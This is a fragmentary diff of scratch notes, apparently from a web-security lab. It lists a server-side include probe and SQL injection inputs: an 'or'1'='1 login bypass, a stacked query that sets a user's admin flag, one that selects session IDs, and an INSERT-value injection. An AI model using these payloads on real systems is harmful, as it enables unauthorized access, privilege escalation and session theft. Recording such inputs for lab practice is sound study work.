@@ -1,0 +1,17 @@
+three of them can not change profie or password, 96 is working fine.so no one could do CSRF attacks, 
+<!--#echo var= "DATE_LOCAL" -->
+ Provender' AND password = ''or'1'='1'; UPDATE Users SET admin = 1 WHERE username = 'Provender
+ 123
+
+Provender' AND password = ''or'1'='1'; SELECT session_id FROM Users WHERE session_id = 'qgxadmlrma
+'or'1'='1
+
+
+
+leo
+123','something',1)
+
+
+
+leo
+123
